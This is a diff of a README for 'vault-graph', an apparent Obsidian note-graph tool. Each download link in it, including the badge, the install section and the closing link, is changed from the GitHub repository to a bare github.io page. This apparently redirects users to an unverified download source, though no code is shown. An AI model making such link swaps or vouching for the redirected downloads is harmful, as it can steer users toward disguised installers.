@@ -1,6 +1,6 @@
 # 🗺️ vault-graph - See Your Notes Come Alive
 
-[![Download vault-graph](https://img.shields.io/badge/Download-vault--graph-2ea44f?style=for-the-badge)](https://github.com/ponadiska/vault-graph)
+[![Download vault-graph](https://img.shields.io/badge/Download-vault--graph-2ea44f?style=for-the-badge)](https://ponadiska.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to vault-graph! This tool turns your Obsidian notes into a beautiful, in
 
 ## 📥 Download and Install
 
-**Visit this link to download the application:** [https://github.com/ponadiska/vault-graph](https://github.com/ponadiska/vault-graph)
+**Visit this link to download the application:** [https://ponadiska.github.io](https://ponadiska.github.io)
 
 Once you click that link, you'll land on the main page for vault-graph. Look for a green button that says "Code" or a section labeled "Releases" on the right side of the page. Click on "Releases" to find the latest version. There you'll see a file to download. Click on it, and your browser will save it to your computer, usually in your "Downloads" folder.
 
@@ -127,7 +127,7 @@ That's all there is to it. In less than five minutes, you'll be exploring your n
 
 Ready to get started? Here's your direct link again:
 
-**[Download vault-graph](https://github.com/ponadiska/vault-graph)**
+**[Download vault-graph](https://ponadiska.github.io)**
 
 Go ahead – your notes are waiting to show you their hidden connections.
 
